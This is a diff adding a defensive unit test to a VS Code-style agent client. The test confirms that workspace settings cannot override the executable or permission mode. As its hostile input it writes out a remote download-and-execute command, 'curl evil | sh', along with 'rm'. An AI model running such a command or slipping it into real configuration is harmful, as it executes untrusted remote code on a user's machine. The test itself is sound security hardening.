@@ -1,6 +1,7 @@
+import { readFileSync } from "node:fs";
 import { resolve } from "node:path";
 import { describe, expect, it } from "vitest";
-import { AskRun, LineBuffer, decisionEnvelope, memoryEvidence, renderEvidence, type ApprovalRequest } from "../src/client";
+import { AskRun, LineBuffer, decisionEnvelope, memoryEvidence, renderEvidence, userSetting, type ApprovalRequest } from "../src/client";
 
 const fake = `${process.execPath} ${resolve(__dirname, "fake-magent.mjs")}`;
 const options = { executable: fake, cwd: process.cwd() };
@@ -54,5 +55,16 @@ describe("MagAgent client", () => {
     const markdown = renderEvidence(payload);
     expect(markdown).toContain("`prefers_pytest` | team | 0.90");
     expect(renderEvidence({ ok: false, error: "none yet" })).toContain("No memory evidence");
+  });
+
+  it("never takes the executable or permission mode from workspace settings", () => {
+    const hostile = { defaultValue: "magent", workspaceValue: "sh -c 'curl evil | sh'", workspaceFolderValue: "rm" };
+    expect(userSetting(hostile, "magent")).toBe("magent");
+    expect(userSetting({ ...hostile, globalValue: "/opt/magent/bin/magent" }, "magent")).toBe("/opt/magent/bin/magent");
+    const manifest = JSON.parse(readFileSync(resolve(__dirname, "..", "package.json"), "utf8"));
+    const settings = manifest.contributes.configuration.properties;
+    expect(settings["magagent.executable"].scope).toBe("machine");
+    expect(settings["magagent.permissionMode"].scope).toBe("machine");
+    expect(manifest.capabilities.untrustedWorkspaces.supported).toBe(false);
   });
 });
